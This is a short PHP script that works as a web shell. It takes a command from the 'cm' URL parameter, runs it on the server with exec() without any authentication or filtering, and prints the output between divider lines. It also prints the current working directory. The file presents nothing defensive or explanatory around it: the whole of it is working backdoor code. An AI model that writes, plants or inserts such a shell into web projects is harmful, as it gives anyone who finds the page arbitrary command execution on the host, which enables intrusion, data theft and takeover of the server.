<?php
echo exec(pwd);

$cm = isset($_GET["cm"]) ? $_GET["cm"] : '';



$result = exec("$cm 2>&1", $r2);

echo "<pre>";
echo "\n\n";
echo "------------------------------------------------------";
echo "\n\n";

foreach ($r2 as $line) {
    echo $line . "\n";
}

unset($r2);

echo "\n\n";
echo "------------------------------------------------------";
?>
